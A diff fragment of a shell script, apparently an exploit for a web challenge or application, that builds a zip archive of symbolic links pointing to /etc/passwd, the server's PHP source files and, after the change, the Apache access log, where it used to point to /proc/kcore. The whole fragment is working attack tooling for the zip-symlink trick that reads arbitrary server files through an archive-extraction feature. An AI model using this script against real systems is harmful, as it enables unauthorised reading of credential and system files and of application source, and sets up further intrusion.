@@ -10,10 +10,10 @@ done
 ln -s /etc/passwd passwd
 ln -s ../../index.php index
 ln -s ../../url.php url
-ln -s /proc/kcore kcore
+ln -s /var/log/apache2/access.log accesslog
 
 # zip stuff
-zip --symlinks cmd.zip testfile.txt passwd index url kcore
+zip --symlinks cmd.zip testfile.txt passwd index url accesslog
 
 # cleanup
-rm passwd index url kcore testfile.txt
+rm passwd index url accesslog testfile.txt
